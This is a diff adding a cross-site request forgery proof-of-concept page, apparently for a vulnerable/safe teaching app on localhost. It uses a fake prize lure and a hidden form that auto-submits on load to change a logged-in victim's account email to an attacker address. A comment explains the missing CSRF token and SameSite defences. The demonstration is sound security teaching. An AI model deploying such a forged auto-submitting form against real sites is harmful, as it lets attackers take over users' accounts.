@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>You won a free gift! 🎁</title>
+</head>
+<body>
+  <!--
+    CSRF proof-of-concept.
+    A victim who is logged in to ShopSmart and then opens THIS page will have
+    their account email silently changed to the attacker's address. The form
+    auto-submits on load; the browser attaches the ShopSmart session cookie.
+
+    VULN mode: the POST /account/change-email has no CSRF token and the session
+               cookie has no SameSite restriction -> the change succeeds.
+    SAFE mode: the request is rejected (403) because it carries no valid CSRF
+               token, and SameSite=Strict stops the cookie riding cross-site.
+
+    Serve this from a different origin to show a true cross-site attack, e.g.:
+        python3 -m http.server 8080
+    then open http://localhost:8080/attacker.html while logged into :3000.
+  -->
+  <h1>Congratulations! Click to claim your prize…</h1>
+  <p>Loading your reward…</p>
+
+  <form id="csrf" action="http://localhost:3000/account/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.test" />
+  </form>
+  <script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
